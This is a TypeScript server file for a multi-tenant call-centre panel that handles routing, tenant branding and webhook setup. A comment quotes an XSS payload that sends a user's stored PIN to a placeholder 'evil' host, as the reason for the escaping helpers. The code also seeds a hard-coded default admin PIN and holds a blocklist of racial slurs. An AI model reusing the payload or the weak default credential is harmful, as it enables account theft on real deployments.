import { Hono } from 'hono';
import { sql, ensureDb } from './src/db';
import { leads } from './src/routes/leads';
import { users } from './src/routes/users';
import { chat } from './src/routes/chat';
import { notifications } from './src/routes/notifications';
import { announcements } from './src/routes/announcements';
import { scripts } from './src/routes/scripts';
import { misc } from './src/routes/misc';
import { CONTROL_PAGE } from './src/control';
import { telephony } from './src/routes/telephony';
import { tenancy } from './src/routes/tenancy';
import { telegram } from './src/routes/telegram';
import { STORE_PAGE } from './src/store';
import { REDEEM_PAGE } from './src/redeem';
import { MASTER_PAGE } from './src/master';
import { MAIN_JS } from './src/frontend';
import { ADMIN_JS } from './src/adminJs';
import { STAFF_JS } from './src/staffJs';
import { page } from './src/frontend';

// Panel name values that must never be rendered anywhere, regardless of where
// they came from (corrupted historical data, a compromised admin session, a
// deliberately malicious tenant name). Checked case-insensitively, trimmed.
const BLOCKED_PANEL_NAMES = new Set(['niggers', 'nigger', 'nigga', 'niggas']);
import * as threecx from './src/threecx';

const app = new Hono();
const ADMIN_PIN = process.env.ADMIN_PIN || '9247';

// Every uncaught error becomes a proper JSON response with the real error message
// logged server-side — never Bun's default plain-text crash page, which is what was
// breaking the frontend's res.json() calls with "Unexpected token 'I'" errors.
app.onError((err, c) => {
  console.error(`[${c.req.method} ${c.req.path}] Unhandled error:`, err);
  return c.json({ error: err.message || 'Internal server error' }, 500);
});

app.use('*', async (c, next) => {
  await ensureDb();
  // Bootstrap: ensure at least one admin exists, seeded from ADMIN_PIN.
  const [existingAdmin] = await sql`SELECT id FROM users WHERE role = 'admin' LIMIT 1`;
  if (!existingAdmin) {
    await sql`INSERT INTO users (name, pin, role) VALUES ('Admin', ${ADMIN_PIN}, 'admin') ON CONFLICT (pin) DO NOTHING`;
  }
  await next();
});

app.route('/', leads);
app.route('/', users);
app.route('/', chat);
app.route('/', notifications);
app.route('/', announcements);
app.route('/', scripts);
app.route('/', misc);
app.route('/', telephony);
app.route('/', tenancy);
app.route('/', telegram);

app.get('/master', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(MASTER_PAGE);
});

app.get('/sw.js', async (c) => {
  const file = Bun.file('./public/sw.js');
  c.header('Content-Type', 'application/javascript');
  c.header('Service-Worker-Allowed', '/');
  return c.body(await file.text());
});

app.get('/control', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(CONTROL_PAGE);
});

app.get('/store', async (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  const [row] = await sql`SELECT value FROM settings WHERE key = 'store_checkout_url'`;
  const checkoutUrl = row?.value || 'https://t.me/+M-aK0jz4wDI5Nzdh';
  return c.html(STORE_PAGE(checkoutUrl));
});

app.get('/redeem', (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  return c.html(REDEEM_PAGE);
});


// panel_name and panel_logo are set by tenant admins — people you resell to, not
// people you control — and were interpolated raw into the served HTML. A name of
// `</title><script>fetch('//evil/'+localStorage.pin)</script>` was stored XSS on
// that tenant's own login page; a logo value containing a quote broke out of the
// src attribute the same way. Everything tenant-controlled goes through here.
function esc(v: unknown): string {
  return String(v ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// A logo is a URL or a data: image. Anything else (javascript:, vbscript:, a
// stray quote) is rejected outright rather than escaped and hoped for.
function safeLogoUrl(v: unknown): string | null {
  const raw = String(v ?? '').trim();
  if (!raw) return null;
  if (/^data:image\/(png|jpeg|jpg|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=]+$/.test(raw)) return raw;
  if (/^\/[A-Za-z0-9._~\-/]*$/.test(raw)) return raw;
  try {
    const u = new URL(raw);
    if (u.protocol === 'http:' || u.protocol === 'https:') return u.toString();
  } catch {}
  return null;
}

app.get('/manifest.json', async (c) => {
  const slug = c.req.query('slug');
  let tenantName: string | undefined;
  let tenantLogo: string | undefined;
  if (slug) {
    const [tenant] = await sql`SELECT panel_name, panel_logo, name FROM tenants WHERE slug = ${slug} AND status = 'active'`;
    tenantName = tenant?.panel_name || tenant?.name;
    tenantLogo = tenant?.panel_logo;
  } else {
    const [selfTenant] = await sql`SELECT panel_name, panel_logo FROM tenants WHERE is_self = true`;
    tenantName = selfTenant?.panel_name;
    tenantLogo = selfTenant?.panel_logo;
    if (!tenantName) {
      const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_name'`;
      tenantName = row?.value;
    }
    if (!tenantLogo) {
      const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_logo'`;
      tenantLogo = row?.value;
    }
  }
  const name = (tenantName && !BLOCKED_PANEL_NAMES.has(tenantName.trim().toLowerCase())) ? tenantName : 'ClearPanel';
  return c.json({
    name,
    short_name: name,
    start_url: slug ? `/${slug}` : '/',
    display: 'standalone',
    background_color: '#08080b',
    theme_color: '#08080b',
    icons: safeLogoUrl(tenantLogo)
      ? [{ src: safeLogoUrl(tenantLogo)!, sizes: '512x512', type: 'image/png' }]
      : [
          { src: '/icon-192.png', sizes: '192x192', type: 'image/png' },
          { src: '/icon-512.png', sizes: '512x512', type: 'image/png' },
        ],
  });
});

app.get('/clearpanel-logo.png', async (c) => { c.header('Content-Type', 'image/png'); c.header('Cache-Control', 'public, max-age=86400'); return c.body(await Bun.file('./public/clearpanel-logo.png').arrayBuffer()); });
app.get('/clearpanel-icon.png', async (c) => { c.header('Content-Type', 'image/png'); c.header('Cache-Control', 'public, max-age=86400'); return c.body(await Bun.file('./public/clearpanel-icon.png').arrayBuffer()); });
app.get('/favicon.png', async (c) => { c.header('Content-Type', 'image/png'); c.header('Cache-Control', 'public, max-age=86400'); return c.body(await Bun.file('./public/favicon.png').arrayBuffer()); });
app.get('/icon.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/icon.png').arrayBuffer()); });
app.get('/icons.js', async (c) => { c.header('Content-Type', 'application/javascript'); c.header('Cache-Control', 'public, max-age=3600'); return c.body(await Bun.file('./public/icons.js').text()); });
// Serve extracted JS blocks as external files so <script src> can load them
// without the HTML-parser-vs-script-content collision that breaks inline blocks.
const JS_CACHE = 'no-store, no-cache, must-revalidate';
app.get('/js/main.js', (c) => { c.header('Content-Type', 'application/javascript'); c.header('Cache-Control', JS_CACHE); return c.text(MAIN_JS); });
app.get('/js/admin.js', (c) => { c.header('Content-Type', 'application/javascript'); c.header('Cache-Control', JS_CACHE); return c.text(ADMIN_JS); });
app.get('/js/staff.js', (c) => { c.header('Content-Type', 'application/javascript'); c.header('Cache-Control', JS_CACHE); return c.text(STAFF_JS); });
app.get('/icon-192.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/icon-192.png').arrayBuffer()); });
app.get('/icon-512.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/icon-512.png').arrayBuffer()); });
app.get('/apple-touch-icon.png', async (c) => { c.header('Content-Type', 'image/png'); return c.body(await Bun.file('./public/apple-touch-icon.png').arrayBuffer()); });

app.get('/', async (c) => {
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  // Serve the self-tenant panel with its own branding. Fallback chain:
  // tenants.panel_name (new, per-tenant) -> settings.panel_name (legacy, pre-migration
  // value) -> "ClearPanel" only as an absolute last resort for a genuinely
  // fresh install with nothing configured anywhere.
  const [selfTenant] = await sql`SELECT * FROM tenants WHERE is_self = true LIMIT 1`;
  let tenantName = selfTenant?.panel_name;
  let tenantLogo = selfTenant?.panel_logo;
  if (!tenantName) {
    const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_name'`;
    tenantName = row?.value || 'ClearPanel';
  }
  // Defense-in-depth: never render a known-bad value even if it somehow
  // survives the DB migration (e.g. this deploy hasn't run migrations yet).
  if (BLOCKED_PANEL_NAMES.has(String(tenantName).trim().toLowerCase())) tenantName = 'ClearPanel';
  if (!tenantLogo) {
    const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_logo'`;
    tenantLogo = row?.value || null;
  }
  const safeLogo = safeLogoUrl(tenantLogo);
  const logoTag = safeLogo ? `<img src="${esc(safeLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />` : '';
  let html = page
    .replace('<title>Frap Ties</title>', `<title>${esc(tenantName)}</title>`)
    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${esc(tenantName)}">`)
    .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${logoTag}</div>`)
    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(tenantName)}</div>`);
  // Empty content (not the string "null") so the frontend's `.content || null`
  // check correctly treats this as "no slug" — a non-empty string is truthy in JS
  // regardless of what it says, so content="null" was breaking every login here.
  html = html.replace('</head>', `<meta id="cp-slug" content=""><meta id="cp-tenant-id" content="${selfTenant?.id ?? ''}"></head>`);
  return c.html(html);
});

// Every resold call center gets its own path here - same shared deployment and
// database as the operator's own instance, but with real data isolation (every
// query is scoped by the authenticated user's own tenant_id). Branding here is
// deliberately just their own call center name, not the operator's logo/settings -
// those are global settings that belong to the self tenant, not shared out.
app.get('/:slug', async (c) => {
  const slug = c.req.param('slug');
  console.log(`[/:slug] received slug="${slug}"`);
  const [tenant] = await sql`SELECT * FROM tenants WHERE slug = ${slug} AND status = 'active'`;
  console.log(`[/:slug] lookup result: tenant=${tenant ? `id=${tenant.id}, name=${tenant.name}, panel_name=${tenant.panel_name}` : 'NOT FOUND'}`);
  if (!tenant) return c.notFound();
  if (tenant.expires_at && new Date(tenant.expires_at) < new Date()) {
    await sql`UPDATE tenants SET status = 'expired' WHERE id = ${tenant.id}`;
    return c.html(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Panel Expired</title><style>*{box-sizing:border-box;margin:0;padding:0;}body{font-family:-apple-system,sans-serif;background:#07070a;color:#eaeaec;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}div{text-align:center;max-width:360px;}h1{font-size:20px;margin-bottom:8px;}p{font-size:13px;color:#8f8f98;line-height:1.6;}</style></head><body><div><h1>Access Expired</h1><p>The access period for <strong>${String(tenant.name).replace(/&/g,'&amp;').replace(/</g,'&lt;')}</strong> has ended. Contact whoever set this up to renew access.</p></div></body></html>`);
  }
  c.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  let tenantName = tenant.panel_name || tenant.name || 'ClearPanel';
  if (BLOCKED_PANEL_NAMES.has(String(tenantName).trim().toLowerCase())) tenantName = tenant.name || 'ClearPanel';
  // New/resold tenants that haven't uploaded their own logo yet get the
  // ClearPanel default mark so their panel looks finished immediately —
  // this never touches the self-tenant (Frap Ties), which is handled by the
  // '/' route above and preserves exactly what it already had.
  const tenantLogo = tenant.panel_logo || '/clearpanel-icon.png';
  const safeLogo = safeLogoUrl(tenantLogo) || '/clearpanel-icon.png';
  const logoTag = `<img src="${esc(safeLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />`;
  let html = page
    .replace('<title>Frap Ties</title>', `<title>${esc(tenantName)}</title>`)
    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${esc(tenantName)}">`)
    .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${logoTag}</div>`)
    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(tenantName)}</div>`)
    .replace('<link rel="manifest" href="/manifest.json">', `<link rel="manifest" href="/manifest.json?slug=${encodeURIComponent(slug)}">`);
  html = html.replace('</head>', `<meta id="cp-slug" content="${slug}"><meta id="cp-tenant-id" content="${tenant.id}"></head>`);
  return c.html(html);
});

// The 3CX Call Control connection is a long-lived socket, not a request handler,
// so it starts with the process rather than lazily on first request — otherwise
// nothing would route inbound calls until an admin happened to open the panel.
// Failure here is deliberately non-fatal: a PBX being unreachable must never stop
// the panel itself from serving.
ensureDb()
  .then(() => threecx.start())
  .then(async () => {
    // Point the master Telegram bot at our webhook. Non-fatal if it fails or
    // if the token isn't set yet — the operator can (re)set it any time by
    // restarting the server after adding the env var.
    try {
      const { setMasterWebhook, isMasterBotConfigured, setGatewayWebhook, isGatewayBotConfigured } = await import('./src/telegram');
      if (isMasterBotConfigured()) {
        const base = process.env.PUBLIC_URL || 'https://fraptiseacdivr.up.railway.app';
        const r = await setMasterWebhook(base);
        if (!r.ok) console.warn('[telegram] webhook install failed:', r.error);
        else console.log('[telegram] master webhook installed');
      }
      if (isGatewayBotConfigured()) {
        const base = process.env.PUBLIC_URL || 'https://fraptiseacdivr.up.railway.app';
        const r = await setGatewayWebhook(base);
        if (!r.ok) console.warn('[telegram] gateway webhook install failed:', r.error);
        else console.log('[telegram] gateway webhook installed');
      }
    } catch (e: any) { console.warn('[telegram] webhook setup skipped:', e?.message); }
  })
  .catch((err) => console.error('[3cx] startup skipped:', err?.message));

export default {
  port: Number(process.env.PORT) || 8080,
  fetch: app.fetch,
};
